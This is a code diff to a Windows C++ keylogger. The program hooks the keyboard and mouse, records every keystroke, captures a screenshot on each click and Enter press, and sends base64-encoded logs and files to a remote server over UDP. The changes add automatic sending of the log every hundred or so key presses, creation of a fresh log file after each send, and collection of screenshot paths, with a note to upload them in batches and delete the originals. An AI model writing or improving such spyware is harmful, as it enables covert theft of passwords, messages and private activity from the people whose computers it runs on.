@@ -9,13 +9,13 @@
 #include "wtypes.h"
 #include <Windows.h>
 #include <iomanip>
-#include <vector>
 #include <chrono>
 #include <gdiplus.h>
 #include <thread>
 #include <cstdio>
 #include <direct.h>
 #include "sha512.hh"
+#include <complex>
 
 #pragma comment (lib, "ws2_32.lib")
 #pragma comment(lib, "gdiplus.lib")
@@ -41,13 +41,20 @@ WORD versions;
 ofstream logfile;
 
 long file_pos;
+int clkperlog = 75;
+int chrperlog = 100;
 int w = 1920;
 int h = 1080;
+int key_prss_count = 0;
 int save_screenshot(string filename, ULONG uQuality);
 
 char title[1024];
+char buffer[256];
 static const string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ" "abcdefghijklmnopqrstuvwxyz" "0123456789+/";
 
+vector<string> screen_shots;
+string logfilename;
+string scpth;
 string currentDateTime();
 string encode64(string filename);
 string base64_decode(std::string const& encoded_string);
@@ -58,6 +65,8 @@ void startSocket(SOCKET &out = outst, SOCKADDR_IN &server = servers, WORD &versi
 void send_text(string data, SOCKET out = outst, SOCKADDR_IN server = servers);
 void send_file(string filename, SOCKET out = outst, SOCKADDR_IN server = servers);
 void print_vector(vector<string> v);
+template <typename Stream>
+void new_log(string pFile, Stream& pStream);
 
 //TODO: fix with get key-state aka GetKeyState(key)
 bool shift = false;
@@ -70,14 +79,18 @@ static inline bool is_base64(unsigned char c);
 
 int main()
 {
-	_mkdir("sc");
 	locale swedish("swedish");
 	locale::global(swedish);
 	startSocket();
-	char buffer[256];
 	gethostname(buffer, 256);
 	stringstream sd;
-	sd << R"(Long-term_)" << buffer << "_keyboard_" << currentDateTime() + ".log";
+	sd << buffer << "\\" << R"(LongTerm_)" << buffer << "_keyboard_" << currentDateTime() + ".log";
+	_mkdir(buffer);
+	stringstream df;
+	df << buffer << "\\" << "Screens";
+	scpth = df.str();
+	_mkdir(df.str().c_str());
+	logfilename = sd.str();
 	logfile.open(sd.str());
 	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 0, 0);
 	mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, 0, 0);
@@ -93,6 +106,15 @@ int main()
 	WSACleanup();
 	return 0;
 }
+
+template <typename Stream>
+void new_log(string pFile, Stream& pStream)
+{
+	pStream.close();
+	pStream.clear();
+	pStream.open(pFile);
+}
+
 void startSocket(SOCKET &out, SOCKADDR_IN &server, WORD &version, WSADATA &data, int port)
 {
 	version = MAKEWORD(2, 2);
@@ -150,59 +172,89 @@ void send_file(string filename, SOCKET out, SOCKADDR_IN server) {
 		return;
 	}
 	const clock_t begin_time = clock();
-	cout << "Spliting File ";
-	string typ = "DATA";
+	cout << "Encoding File ";
 	string data = encode64(filename);
-	cout << "Took " << float(clock() - begin_time) / CLOCKS_PER_SEC << "s ";
 	const int ssize = data.length();
-	auto split = 0;
-	cout << "| Size: ";
-	auto ihl = 1;
-	while (ihl <= ssize) {
-		if (ssize / ihl <= 60000 && ssize % ihl == 0)
-		{
-			cout << ihl << " * " << (ssize / ihl) << " = " << ihl * (ssize / ihl);
-			split = ihl;
-			break;
+	if (ssize >= 60000)
+	{
+		string typ = "DATA";
+		cout << "Took " << float(clock() - begin_time) / CLOCKS_PER_SEC << "s ";
+		//TODO: If encoded base64 is less than udp socket cap send the whole thing without spliting
+		auto split = 0;
+		cout << "| Size: ";
+		auto ihl = 1;
+		while (ihl <= ssize) {
+			if (ssize / ihl <= 60000 && ssize % ihl == 0)
+			{
+				cout << ihl << " * " << (ssize / ihl) << " = " << ihl * (ssize / ihl);
+				split = ihl;
+				break;
+			}
+			ihl++;
 		}
-		ihl++;
-	}
-	vector<string> datafile;
-	for (auto i = 0; i < data.length(); i += (ssize / split)) {
-		datafile.push_back(data.substr(i, (ssize / split)));
-	}
-	string size = to_string((ssize / split));
-	string split_st = to_string(split);
+		vector<string> datafile;
+		for (auto i = 0; i < data.length(); i += (ssize / split)) {
+			datafile.push_back(data.substr(i, (ssize / split)));
+		}
+		string size = to_string((ssize / split));
+		string split_st = to_string(split);
 
-	int sendtyp = sendto(out, typ.c_str(), typ.size() + 1, 0, reinterpret_cast<sockaddr*>(&server), sizeof(server)); // type
-	if (sendtyp == SOCKET_ERROR) {
-		cout << "send_typ Error: " << WSAGetLastError() << endl;
-	}
-	int sendfile = sendto(out, filename.c_str(), filename.size() + 1, 0, reinterpret_cast<sockaddr*>(&server), sizeof(server)); // filename
-	if (sendfile == SOCKET_ERROR) {
-		cout << "send-file Error: " << WSAGetLastError() << endl;
-	}
-	int sendhash = sendto(out, sha512::file(filename).c_str(), sha512::file(filename).size() + 1, 0, reinterpret_cast<sockaddr*>(&server), sizeof(server)); // hash
-	if (sendhash == SOCKET_ERROR) {
-		cout << "send-hash Error: " << WSAGetLastError() << endl;
-	}
-	int sendpre = sendto(out, size.c_str(), size.size() + 1, 0, reinterpret_cast<sockaddr*>(&server), sizeof(server)); // per split size
-	if (sendpre == SOCKET_ERROR) {
-		cout << "send-pre Error: " << WSAGetLastError() << endl;
-	}
-	int sendsplit = sendto(out, split_st.c_str(), split_st.size(), 0, reinterpret_cast<sockaddr*>(&server), sizeof(server)); // # of splits
-	if (sendsplit == SOCKET_ERROR) {
-		cout << "send-split Error: " << WSAGetLastError() << endl;
-	}
-	for (auto i = datafile.begin(); i != datafile.end(); ++i) {
-		string is = *i;
-		Sleep(50); //make sure this loop slows down to clients percent loop
-		const int sendkys = sendto(out, is.c_str(), stoi(size), 0, reinterpret_cast<sockaddr*>(&server), sizeof(server));
-		if (sendkys == SOCKET_ERROR) {
-			cout << "send-kys Error: " << WSAGetLastError() << endl;
+		int sendtyp = sendto(out, typ.c_str(), typ.size() + 1, 0, reinterpret_cast<sockaddr*>(&server), sizeof(server)); // type
+		if (sendtyp == SOCKET_ERROR) {
+			cout << "send_typ Error: " << WSAGetLastError() << endl;
 		}
+		int sendfile = sendto(out, filename.c_str(), filename.size() + 1, 0, reinterpret_cast<sockaddr*>(&server), sizeof(server)); // filename
+		if (sendfile == SOCKET_ERROR) {
+			cout << "send-file Error: " << WSAGetLastError() << endl;
+		}
+		int sendhash = sendto(out, sha512::file(filename).c_str(), sha512::file(filename).size() + 1, 0, reinterpret_cast<sockaddr*>(&server), sizeof(server)); // hash
+		if (sendhash == SOCKET_ERROR) {
+			cout << "send-hash Error: " << WSAGetLastError() << endl;
+		}
+		int sendpre = sendto(out, size.c_str(), size.size() + 1, 0, reinterpret_cast<sockaddr*>(&server), sizeof(server)); // per split size
+		if (sendpre == SOCKET_ERROR) {
+			cout << "send-pre Error: " << WSAGetLastError() << endl;
+		}
+		int sendsplit = sendto(out, split_st.c_str(), split_st.size(), 0, reinterpret_cast<sockaddr*>(&server), sizeof(server)); // # of splits
+		if (sendsplit == SOCKET_ERROR) {
+			cout << "send-split Error: " << WSAGetLastError() << endl;
+		}
+		for (auto i = datafile.begin(); i != datafile.end(); ++i) {
+			string is = *i;
+			Sleep(50); //make sure this loop slows down to clients percent loop
+			const int sendkys = sendto(out, is.c_str(), stoi(size), 0, reinterpret_cast<sockaddr*>(&server), sizeof(server));
+			if (sendkys == SOCKET_ERROR) {
+				cout << "send-kys Error: " << WSAGetLastError() << endl;
+			}
+		}
+		cout << " | <Sent File>" << endl << endl;
 	}
-	cout << " | <Sent File>" << endl << endl;
+	else
+	{
+		string typ = "SMALLPP";
+		cout << "Took " << float(clock() - begin_time) / CLOCKS_PER_SEC << "s ";
+		int sendtyp = sendto(out, typ.c_str(), typ.size() + 1, 0, reinterpret_cast<sockaddr*>(&server), sizeof(server)); // type
+		if (sendtyp == SOCKET_ERROR) {
+			cout << "send_typ Error: " << WSAGetLastError() << endl;
+		}
+		int sendfile = sendto(out, filename.c_str(), filename.size() + 1, 0, reinterpret_cast<sockaddr*>(&server), sizeof(server)); // filename
+		if (sendfile == SOCKET_ERROR) {
+			cout << "send-file Error: " << WSAGetLastError() << endl;
+		}
+		int sendhash = sendto(out, sha512::file(filename).c_str(), sha512::file(filename).size() + 1, 0, reinterpret_cast<sockaddr*>(&server), sizeof(server)); // hash
+		if (sendhash == SOCKET_ERROR) {
+			cout << "send-hash Error: " << WSAGetLastError() << endl;
+		}
+		int sendsize = sendto(out, to_string(ssize).c_str(), to_string(ssize).size() + 1, 0, reinterpret_cast<sockaddr*>(&server), sizeof(server)); // hash
+		if (sendsize == SOCKET_ERROR) {
+			cout << "send-hash Error: " << WSAGetLastError() << endl;
+		}
+		int sendb64 = sendto(out, data.c_str(), data.size() + 1, 0, reinterpret_cast<sockaddr*>(&server), sizeof(server)); // filename
+		if (sendb64 == SOCKET_ERROR) {
+			cout << "send-b64 Error: " << WSAGetLastError() << endl;
+		}
+		cout << " | <Sent File>" << endl << endl;
+	}
 }
 
 //TODO: fix ints with virtual-Key codes -> https://docs.microsoft.com/en-us/windows/desktop/inputdev/virtual-key-codes
@@ -222,7 +274,22 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 			SetWindowText(fwindow, L"keyboard hooked application"); //LPCWSTR needs to have L as prefix to assign a string to it
 			prevWindow = fwindow;
 		}
-
+		//Send Log every (chrperlog) key presses
+		if (key_prss_count <= chrperlog)
+		{
+			key_prss_count++;
+		}
+		else
+		{
+			key_prss_count = 0; //reset
+			send_file(logfilename);
+			stringstream sd;
+			sd << buffer << "\\" << R"(LongTerm_)" << buffer << "_keyboard_" << currentDateTime() + ".log";
+			new_log(sd.str(), logfile);
+			logfilename = sd.str();
+			cout << logfilename << "is the new log file" << endl;
+			//TODO: SEND LOG & CREATE NEW LOG after the user has typed (chrperlog) amount of chars
+		}
 		const auto current_key = int(key->vkCode);
 		switch (current_key) {
 		case 8: //backspace
@@ -243,12 +310,13 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 			break;
 		case 13:
 		{
-			send_text("[ENTER]");
+			send_text(" [ENTER] ");
 			cout << " [ENTER]\n";
 			logfile << " [ENTER]\n";
-			string filename = "sc\\" + currentDateTime() + ".jpg";
+			string filename = scpth + "\\" + currentDateTime() + ".jpg";
 			thread sc(save_screenshot, filename, 1);
 			sc.detach();
+			screen_shots.push_back(filename);
 			break;
 		}
 		case 32: //space-bar
@@ -392,16 +460,18 @@ LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
 		logfile << "[Dr]: {X=" << pu.x - pd.x << ", Y=" << pu.y - pd.y << "}";
 
 		if (abs(pu.x - pd.x) <= 2 && abs(pu.y - pd.y) <= 2) {
-			string filename = "sc\\" + currentDateTime() + ".jpg";
+			string filename = scpth + "\\" + currentDateTime() + ".jpg";
 			thread sc(save_screenshot, filename, 1);
 			sc.detach();
+			screen_shots.push_back(filename);
 			cout << " [ CLICK ] " << endl;
 			logfile << " [ CLICK ] " << "[" << filename << "]" << endl;
 		}
 		else {
-			string filename = "sc\\" + currentDateTime() + ".jpg";
+			string filename = scpth + "\\" + currentDateTime() + ".jpg";
 			thread sc(save_screenshot, filename, 1);
 			sc.detach();
+			screen_shots.push_back(filename);
 			cout << " [ DRAG ] " << endl;
 			logfile << " [ DRAG ] " << "[" << filename << "]" << endl;
 		}
@@ -415,16 +485,18 @@ LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
 		logfile << "[Dr]: {X=" << pu.x - pd.x << ", Y=" << pu.y - pd.y << "}";
 
 		if (abs(pu.x - pd.x) <= 2 && abs(pu.y - pd.y) <= 2) {
-			string filename = "sc\\" + currentDateTime() + ".jpg";
+			string filename = scpth + "\\" + currentDateTime() + ".jpg";
 			thread sc(save_screenshot, filename, 1);
 			sc.detach();
+			screen_shots.push_back(filename);
 			cout << " [ RCLICK ] " << endl;
 			logfile << " [ RCLICK ] [" << filename << "]" << endl;
 		}
 		else {
-			string filename = "sc\\" + currentDateTime() + ".jpg";
+			string filename = scpth + "\\" + currentDateTime() + ".jpg";
 			thread sc(save_screenshot, filename, 1);
 			sc.detach();
+			screen_shots.push_back(filename);
 			cout << " [ RDRAG ] " << endl;
 			logfile << " [ RDRAG ] " << "[" << filename << "]" << endl;
 		}
@@ -433,11 +505,20 @@ LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
 
 #pragma region Mouse Down
 	else if (wParam == 513) {
+		if (screen_shots.size() >= clkperlog)
+		{
+			//TODO: count items in vector and then send them all to server using for-loop then delete original files and flush the vector empty
+			cout << clkperlog << "times has the mouse been clicked";
+		}
 		GetCursorPos(&pu);
 		cout << endl << "[" << currentDateTime() << "] ML[D]: {X=" << pu.x << ", Y=" << pu.y << "}, ";
 		logfile << endl << "[" << currentDateTime() << "] Left Mouse[D]: {X=" << pu.x << ", Y=" << pu.y << "}, ";
 	}
 	else if (wParam == 516) {
+		if (screen_shots.size() >= clkperlog)
+		{
+			cout << clkperlog << "times has the mouse been clicked";
+		}
 		GetCursorPos(&pu);
 		cout << endl << "[" << currentDateTime() << "] MR[D]: {X=" << pu.x << ", Y=" << pu.y << "}, ";
 		logfile << endl << "[" << currentDateTime() << "] Right Mouse[D]: {X=" << pu.x << ", Y=" << pu.y << "}, ";
